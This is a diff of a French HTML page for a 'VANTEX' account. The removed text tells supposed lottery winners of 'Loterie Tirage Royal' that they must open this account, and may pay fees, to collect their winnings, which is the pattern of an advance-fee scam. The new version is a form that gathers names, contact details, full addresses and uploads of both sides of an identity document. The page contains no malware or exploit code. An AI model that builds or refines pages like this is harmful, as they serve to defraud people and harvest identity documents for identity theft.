@@ -1,175 +1,289 @@
-<!DOCTYPE html>
+<!DOCTYPE html> 
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<title>Ouverture de Compte VANTEX</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Créer un compte VANTEX</title>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/css/intlTelInput.css" />
 
 <style>
-    body {
-        margin: 0;
-        padding: 0;
-        font-family: Arial, sans-serif;
-        color: #fff;
-        background: linear-gradient(135deg, #11998e, #0575e6);
-        min-height: 100vh;
-    }
+* { box-sizing: border-box; }
+body {
+  margin: 0;
+  font-family: "Inter", sans-serif;
+  background: #f0f2f5; /* Fond uniforme comme les autres pages */
+  padding: 0;
+}
 
-    .container {
-        max-width: 900px;
-        margin: 2rem auto;
-        background: rgba(255,255,255,0.08);
-        padding: 2rem;
-        border-radius: 15px;
-        box-shadow: 0 0 20px rgba(0,0,0,0.25);
-    }
+/* WRAPPER */
+.card-wrapper {
+  max-width: 1100px;
+  margin: 50px auto;
+  background: #fff;
+  border-radius: 16px;
+  overflow: hidden;
+  box-shadow: 0 8px 28px rgba(0,0,0,0.08);
+  display: flex;
+  flex-direction: column;
+}
 
-    /* IMAGE RECTANGLE */
-    .main-image {
-        width: 100%;
-        height: auto;
-        border-radius: 12px;
-        box-shadow: 0 0 15px rgba(0,0,0,0.3);
-        margin-bottom: 1rem;
-    }
+/* IMAGE */
+.card-img {
+  width: 100%;
+  height: 220px;
+  background: url('/image/vantex.jpg') center/cover no-repeat;
+  order: 2; /* Sur mobile, après le formulaire */
+}
 
-    /* BARRE BOUTON OUVRIR COMPTE */
-    .open-bar {
-        display: flex;
-        justify-content: flex-start;
-        padding: 1rem 0;
-        margin-bottom: 2rem;
-    }
+/* IMAGE À GAUCHE SUR PC */
+@media (min-width: 920px) {
+  .card-wrapper {
+    flex-direction: row;
+  }
+  .card-img {
+    width: 40%;
+    height: auto;
+    order: 0; /* Sur PC, à gauche */
+  }
+}
 
-    .btn-primary {
-        background: linear-gradient(90deg, #ffcc33, #e6a800);
-        border: none;
-        padding: 0.9rem 1.5rem;
-        font-size: 1.1rem;
-        border-radius: 8px;
-        cursor: pointer;
-        font-weight: bold;
-        color: #000;
-        box-shadow: 0 0 15px rgba(255,184,0,0.45);
-        transition: 0.3s;
-        text-decoration: none;
-        display: inline-block;
-    }
+/* FORMULAIRE */
+.card {
+  width: 100%;
+  padding: 40px;
+  order: 1; /* Toujours avant image sur mobile */
+}
 
-    .btn-primary:hover {
-        transform: scale(1.07);
-        box-shadow: 0 0 20px rgba(255,184,0,0.75);
-    }
+h1 {
+  text-align: center;
+  color: #0A9999; /* Même couleur que les autres pages */
+  font-size: 2rem;
+  margin-bottom: 10px;
+  font-weight: 600;
+}
+.subtitle {
+  text-align: center;
+  margin-bottom: 32px;
+  color: #555; /* Couleur uniforme pour toutes les pages */
+  font-size: 1rem;
+}
 
-    /* CONDITIONS */
-    .conditions {
-        background: rgba(0,0,0,0.25);
-        padding: 1.5rem;
-        border-radius: 12px;
-        line-height: 1.6;
-        font-size: 1.05rem;
-        margin-bottom: 2rem;
-    }
+/* GRID */
+.form-grid {
+  display: grid;
+  gap: 22px;
+}
+.grid-2 { grid-template-columns: 1fr; }
+@media (min-width: 850px) {
+  .grid-2 { grid-template-columns: 1fr 1fr; }
+}
 
-    .conditions h3 {
-        margin-top: 0;
-        color: #ffcc33;
-    }
+/* FIELD */
+.field {
+  position: relative;
+}
 
-    .conditions ul {
-        padding-left: 1rem;
-    }
+.field input,
+.field select {
+  width: 100%;
+  height: 50px;
+  padding: 0 14px;
+  border: 1.7px solid #dce3e8;
+  border-radius: 10px;
+  font-size: 1rem;
+  background: #fff;
+  transition: 0.2s;
+}
 
-    .conditions li {
-        margin-bottom: 0.6rem;
-    }
+.field input:focus,
+.field select:focus {
+  border-color: #0A9999;
+  box-shadow: 0 0 0 3px rgba(10,153,153,0.18);
+}
 
-    /* BARRE CENTRÉE VERTICALE */
-    .continue-section {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        gap: 1rem;
-        background: rgba(0,0,0,0.2);
-        padding: 1.5rem;
-        border-radius: 12px;
-    }
+/* LABEL FLOATING */
+.field label {
+  position: absolute;
+  left: 14px;
+  top: -10px;
+  background: #fff;
+  padding: 0 5px;
+  font-size: 0.78rem;
+  color: #0A9999;
+  pointer-events: none;
+}
 
-    .continue-text {
-        font-size: 1.2rem;
-        font-weight: bold;
-        text-align: center;
-    }
+/* TELEPHONE */
+.phone .iti {
+  width: 100%;
+}
+.phone input {
+  padding-left: 90px !important;
+}
 
-    .arrow {
-        font-size: 2rem;
-        animation: bounce 1.3s infinite;
-        color: #ffcc33;
-    }
+/* FILE */
+.field input[type=file] {
+  padding-top: 11px;
+}
 
-    @keyframes bounce {
-        0% { transform: translateY(0); }
-        50% { transform: translateY(8px); }
-        100% { transform: translateY(0); }
-    }
+/* BUTTON */
+.btn {
+  width: 100%;
+  height: 52px;
+  margin-top: 12px;
+  background: #0A9999;
+  color: #fff;
+  border: none;
+  border-radius: 10px;
+  font-size: 1.08rem;
+  cursor: pointer;
+}
+.btn:hover { background: #087a7a; }
 
-    /* RESPONSIVE */
-    @media (max-width: 768px) {
-        .btn-primary {
-            padding: 0.8rem 1.2rem;
-            font-size: 1rem;
-        }
-        .arrow {
-            font-size: 1.8rem;
-        }
-        .continue-text {
-            font-size: 1.1rem;
-        }
-    }
 </style>
 </head>
+
 <body>
 
-<div class="container">
+<div class="card-wrapper">
 
-    <!-- IMAGE RECTANGLE -->
-    <img src="/image/bank.jpg" alt="Bank" class="main-image">
+  <div class="card">
 
-    <!-- BARRE OUVRIR COMPTE -->
-    <div class="open-bar">
-        <a href="/paiement/vantex-open" target="_blank" class="btn-primary">
-            Ouvrir un Compte
-        </a>
-    </div>
+    <h1>Créer un compte VANTEX</h1>
+    <p class="subtitle">Formulaire sécurisé — Style professionnel uniforme</p>
 
-    <!-- CONDITIONS -->
-    <div class="conditions">
-        <h3>Conditions d’ouverture du Compte Bancaire VANTEX</h3>
-        <p>Chers gagnants, suite au partenariat officiel entre la Loterie Tirage Royal et VANTEX FINANCE, la création d’un compte VANTEX est obligatoire pour tout retrait de gain. Veuillez prendre connaissance des conditions suivantes :</p>
-        <ul>
-            <li>📌 Être majeur et fournir un document d'identité valide.</li>
-            <li>📌 Fournir une adresse postale complète et vérifiable.</li>
-            <li>📌 Posséder un numéro de téléphone actif pour la validation.</li>
-            <li>📌 Les transferts de fonds sont sécurisés et traités sous 24h.</li>
-            <li>📌 Des frais minimes peuvent s'appliquer selon le pays ou la devise.</li>
-            <li>📌 Le compte sera approuvé par les administrateurs de VANTEX dans un délai de 24 heurs..</li>
-        </ul>
-        <p style="margin-top:1rem;">Une fois le compte créé, revenez sur Tirage Royal pour valider votre retrait.</p>
-    </div>
+    <form action="/paiement/vantex/submit" method="POST" enctype="multipart/form-data">
 
-    <!-- BARRE CENTRÉE : TEXTE + FLECHE + BOUTON -->
-    <div class="continue-section">
-        <div class="continue-text">Cliquer ici pour continuer</div>
-        <div class="arrow">⬇️</div>
-        <a href="/paiement/vantex-open" target="_blank" class="btn-primary">
-            Continuer l’ouverture du compte
-        </a>
-    </div>
+      <div class="form-grid grid-2">
+
+        <!-- CIVILITÉ -->
+        <div class="field">
+          <select name="civility" required>
+            <option value="" disabled selected></option>
+            <option value="M.">M.</option>
+            <option value="Mme">Mme</option>
+            <option value="Mlle">Mlle</option>
+            <option value="Dr">Dr</option>
+            <option value="Pr">Pr</option>
+            <option value="Me">Me</option>
+            <option value="Pr.">Pr.</option>
+            <option value="Ing.">Ing.</option>
+          </select>
+          <label>Civilité</label>
+        </div>
+
+        <!-- PRENOM -->
+        <div class="field">
+          <input type="text" name="firstname" placeholder=" " required />
+          <label>Prénom</label>
+        </div>
+
+        <!-- NOM -->
+        <div class="field" style="grid-column:1/-1;">
+          <input type="text" name="lastname" placeholder=" " required />
+          <label>Nom</label>
+        </div>
+
+        <!-- EMAIL -->
+        <div class="field">
+          <input type="email" name="email" placeholder=" " required />
+          <label>Email</label>
+        </div>
+
+        <!-- PHONE -->
+        <div class="field phone">
+          <label style="top:-10px;">Téléphone</label>
+          <input type="tel" id="phone" name="phone" required />
+        </div>
+
+        <!-- PROFESSION -->
+        <div class="field" style="grid-column:1/-1;">
+          <input type="text" name="profession" placeholder=" " required />
+          <label>Profession</label>
+        </div>
+
+        <!-- COUNTRY -->
+        <div class="field">
+          <select id="country" name="country" required>
+            <option value="" selected disabled></option>
+          </select>
+          <label>Pays</label>
+        </div>
+
+        <!-- REGION TEXTE LIBRE -->
+        <div class="field">
+          <input type="text" name="region" placeholder=" " required />
+          <label>Région / Province</label>
+        </div>
+
+        <!-- STREET -->
+        <div class="field" style="grid-column:1/-1;">
+          <input type="text" name="street" placeholder=" " required />
+          <label>Rue</label>
+        </div>
+
+        <!-- CITY -->
+        <div class="field">
+          <input type="text" name="city" placeholder=" " required />
+          <label>Ville</label>
+        </div>
+
+        <!-- ZIP -->
+        <div class="field">
+          <input type="text" name="zip" placeholder=" " required />
+          <label>Code postal</label>
+        </div>
+
+        <!-- FILES -->
+        <div class="field file" style="grid-column:1/-1;">
+          <input type="file" name="id_front" accept=".jpg,.png,.jpeg,.pdf" required />
+          <label>Document d'identité — recto</label>
+        </div>
+
+        <div class="field file" style="grid-column:1/-1;">
+          <input type="file" name="id_back" accept=".jpg,.png,.jpeg,.pdf" required />
+          <label>Document d'identité — verso</label>
+        </div>
+
+      </div>
+
+      <button class="btn">Créer mon compte</button>
+
+    </form>
+  </div>
+
+  <div class="card-img"></div> <!-- IMAGE SUR MOBILE APRÈS LE FORMULAIRE -->
 
 </div>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>
+
+<script>
+const phone = document.querySelector("#phone");
+window.intlTelInput(phone, {
+  separateDialCode: true,
+  initialCountry: "fr",
+  preferredCountries: ["fr","be","ca","ch"],
+  utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js"
+});
+
+/* PAYS */
+async function loadCountries() {
+  const res = await fetch("/json/countries.json");
+  const data = await res.json();
+  const sel = document.getElementById("country");
+
+  data.sort((a,b)=> a.name.common.localeCompare(b.name.common));
+  data.forEach(c=>{
+    const opt=document.createElement("option");
+    opt.value=c.cca2;
+    opt.textContent=c.name.common;
+    sel.appendChild(opt);
+  });
+}
+loadCountries();
+</script>
+
 </body>
 </html>
-
-
-
